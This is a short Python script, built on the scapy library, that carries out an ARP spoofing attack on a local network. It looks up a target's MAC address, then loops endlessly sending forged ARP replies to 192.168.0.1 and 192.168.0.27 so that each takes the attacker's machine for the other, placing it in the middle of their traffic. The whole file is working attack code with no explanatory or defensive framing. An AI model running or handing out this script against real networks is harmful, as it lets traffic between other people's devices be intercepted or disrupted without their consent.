#!/usr/bin/python

# allows us to manipulate packets
import scapy.all as scapy

def get_target_mac(ip):
    arp_req = scapy.ARP(pdst=ip)
    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    finalPacket = broadcast/arp_req
    answer = scapy.srp(finalPacket, timeout=2, verbose=False)[0]
    mac = answer[0][1].hwsrc
    return mac

def spoof_args(targetIP, spoofedIP):
    mac = get_target_mac(targetIP)
    packet = scapy.ARP(op=2, hwdst=mac, pdst=targetIP, psrc=spoofedIP)
    scapy.send(packet, verbose=False)

def main():
    try:
        while True:
            spoof_args("192.168.0.1", "192.168.0.27")
            spoof_args("192.168.0.27", "192.168.0.1")
    except KeyboardInterrupt:
        print("bye")
        exit(0)



if __name__ == '__main__':
    main()